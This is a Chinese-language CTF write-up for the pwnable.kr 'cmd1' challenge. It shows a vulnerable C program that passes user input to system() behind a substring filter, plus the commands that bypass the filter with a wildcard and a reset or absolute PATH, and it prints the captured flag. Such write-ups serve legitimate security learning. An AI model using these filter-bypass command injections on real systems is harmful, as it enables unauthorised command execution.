---
title: 'pwnable.kr #cmd1'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-06-26 20:35:43
categories:
    - Writeups
	  - pwnable.kr
thumbnailImage: pwnablekr.jpg
keywords:
    - pwnable.kr
    - Toddler's Bottle
    - cmd1
tags:
    - Writeups
---
環境變數的基本知識
<!-- more -->
題目原始碼：
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```

可以看到`filter()`過濾掉`argv[1]`裡面不能包含的`flag`、`sh`、`tmp`子字串，這部分用萬用字元`*`就可以繞過限制。

另外在第12行把重要的環境變數`PATH`給覆寫掉了，這樣如果想要直接呼叫`cat`把flag印出來會得到以下錯誤：
```
cmd1@ubuntu:~$ ./cmd1 "cat fla*"
sh: 1: cat: not found
```

所以說，在呼叫`cat`以前我們必須先修改環境變數：
```
cmd1@ubuntu:~$ ./cmd1 "export PATH=/bin; cat fla*"
mommy now I get what PATH environment is for :)
```

或是更簡單的方法，先確認`cat`的路徑以後使用絕對路徑呼叫即可：
```
cmd1@ubuntu:~$ which cat
/bin/cat
cmd1@ubuntu:~$ ./cmd1 "/bin/cat fla*"
mommy now I get what PATH environment is for :)
```